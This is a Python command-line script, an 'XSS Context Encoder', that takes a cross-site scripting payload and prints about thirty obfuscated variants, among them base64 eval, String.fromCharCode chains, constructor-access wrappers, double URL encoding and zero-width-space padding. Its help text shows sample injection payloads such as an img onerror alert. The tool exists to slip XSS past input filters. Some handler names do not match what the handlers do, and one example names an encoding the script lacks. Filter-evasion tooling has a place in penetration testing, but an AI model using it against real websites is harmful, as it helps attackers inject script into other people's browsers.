#!/usr/bin/env python3
import argparse
import json
import sys
import urllib.parse
import base64
import html

ENCODING_HANDLERS = {
    "url_encoded": lambda p: urllib.parse.quote(p, safe=""),
    "double_url_encoded": lambda p: urllib.parse.quote(urllib.parse.quote(p, safe=""), safe=""),
    "html_entities_named": lambda p: "".join(f"&#x{ord(c):x};" for c in p),
    "html_entities_decimal": lambda p: "".join(f"&#{ord(c)};" for c in p),
    "hex_entities": lambda p: "".join(f"&#x{ord(c):x};" for c in p),
    "unicode_escapes": lambda p: "".join(f"\\u{ord(c):04x}" for c in p),
    "unicode_escapes_hex": lambda p: "".join(f"\\x{ord(c):02x}" for c in p),
    "base64_data_uri": lambda p: f"data:text/html;base64,{base64.b64encode(p.encode()).decode()}",
    "base64_js_eval": lambda p: f"eval(atob(\"{base64.b64encode(p.encode()).decode()}\"))",
    "js_string_escape": lambda p: p.replace("\\", "\\\\").replace("'", "\\'").replace('"', '\\"').replace("\n", "\\n"),
    "js_template_literal": lambda p: f"`${{{p}}}`",
    "html_named_entities": lambda p: html.escape(p),
    "upper_case": lambda p: p.upper(),
    "lower_case": lambda p: p.lower(),
    "mixed_case": lambda p: "".join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(p)),
    "reversed": lambda p: p[::-1],
    "rot13": lambda p: "".join(chr(((ord(c) - 65 + 13) % 26) + 65) if "A" <= c <= "Z" else chr(((ord(c) - 97 + 13) % 26) + 97) if "a" <= c <= "z" else c for c in p),
    "from_char_code": lambda p: "+".join(f"String.fromCharCode({ord(c)})" for c in p),
    "nul_byte_padded": lambda p: "".join(f"{c}%00" for c in p),
    "tab_newline_injected": lambda p: "".join(f"{c}\t" for c in p),
    "backtick_encoded": lambda p: "".join(f"`{c}`+" if c != "+" else f"`{c}`+" for c in f"{p}+").rstrip("+"),
    "jsfuck_style": lambda p: "".join(f"({ord(c)})" for c in p),
    "percent_encoded_all": lambda p: "".join(f"%{ord(c):02X}" for c in p),
    "zero_width_spaces": lambda p: "".join(f"{c}\u200b" for c in p),
    "null_terminated": lambda p: p + "\x00",
    "newline_injected": lambda p: p + "\n",
    "crlf_injected": lambda p: p + "\r\n",
    "space_padded": lambda p: f" {p} ",
    "atob_btoa": lambda p: f"atob('{base64.b64encode(p.encode()).decode()}')",
    "template_literal_tagged": lambda p: f"`${{{p}}}`",
    "js_eval": lambda p: f"eval({json.dumps(p)})",
    "constructor_access": lambda p: f"[]['constructor']['constructor']({json.dumps(p)})()",
}


def generate_encodings(payload, encodings=None):
    if encodings is None:
        encodings = list(ENCODING_HANDLERS.keys())
    results = []
    for name in encodings:
        if name not in ENCODING_HANDLERS:
            results.append({
                "encoding_type": name,
                "encoded_payload": None,
                "error": f"unknown encoding: {name}",
            })
            continue
        try:
            encoded = ENCODING_HANDLERS[name](payload)
            results.append({
                "encoding_type": name,
                "encoded_payload": encoded,
                "input_length": len(payload),
                "output_length": len(encoded) if encoded else 0,
            })
        except Exception as e:
            results.append({
                "encoding_type": name,
                "encoded_payload": None,
                "error": str(e),
            })
    return results


def list_encodings():
    for name in sorted(ENCODING_HANDLERS.keys()):
        print(f"  {name}", file=sys.stderr)


def main():
    parser = argparse.ArgumentParser(
        description="XSS Context Encoder — generate all encoding variants of an XSS payload",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s --payload '"><img src=x onerror=alert(1)>'
  echo '<script>alert(1)</script>' | %(prog)s
  %(prog)s --payload '<svg onload=alert(1)>' --encodings url_encoded,html_entities_hex,base64_js_eval
  %(prog)s --list-encodings
        """,
    )
    parser.add_argument("--context", default=None, help="Path to context.json")
    parser.add_argument("--payload", default=None, help="Raw XSS payload to encode")
    parser.add_argument("--encodings", default=None, help="Comma-separated encoding types to generate (default: all)")
    parser.add_argument("--list-encodings", action="store_true", help="List all available encoding types and exit")
    parser.add_argument("--dry-run", action="store_true", help="Print encodings that would be applied without generating")
    args = parser.parse_args()

    if args.list_encodings:
        print(json.dumps(sorted(ENCODING_HANDLERS.keys()), indent=2))
        return

    payload = args.payload
    if not payload:
        if not sys.stdin.isatty():
            payload = sys.stdin.read().strip()
        if not payload:
            print("[error] No payload provided. Use --payload or pipe via stdin.", file=sys.stderr)
            parser.print_help(file=sys.stderr)
            sys.exit(1)

    encoding_names = None
    if args.encodings:
        encoding_names = [e.strip() for e in args.encodings.split(",") if e.strip()]

    if args.dry_run:
        if encoding_names:
            dry_encodings = [n for n in encoding_names if n in ENCODING_HANDLERS]
        else:
            dry_encodings = sorted(ENCODING_HANDLERS.keys())
        print(f"[dry-run] Would encode payload '{payload[:80]}...' with {len(dry_encodings)} encodings: {', '.join(dry_encodings)}", file=sys.stderr)
        return

    results = generate_encodings(payload, encoding_names)
    output = {
        "original_payload": payload,
        "original_length": len(payload),
        "encodings_generated": len(results),
        "variants": results,
    }
    print(json.dumps(output, indent=2))


if __name__ == "__main__":
    main()